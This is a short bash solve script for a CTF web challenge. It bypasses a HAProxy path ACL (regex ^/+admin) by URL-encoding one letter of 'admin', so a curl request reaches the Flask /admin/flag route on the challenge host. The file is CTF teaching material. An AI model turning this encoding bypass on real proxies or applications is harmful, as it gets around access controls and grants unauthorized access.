#!/bin/bash
# Borderline Personality - EHAXctf Web Challenge
# HAProxy ACL bypass via URL encoding
#
# The HAProxy ACL uses regex: ^/+admin
# This matches literal "admin" but URL-encoded chars (%61 = 'a') bypass it.
# Flask/gunicorn decodes the URL before routing, so /admin/flag is reached.

TARGET="${1:-http://chall.ehax.in:9098}"

echo "[*] Bypassing HAProxy ACL via URL-encoded path..."
echo "[*] Target: ${TARGET}"
echo ""

# %61 = 'a' — bypasses regex match on literal "admin"
curl -sS --path-as-is "${TARGET}/%61dmin/flag"

echo ""
echo "[*] Done."
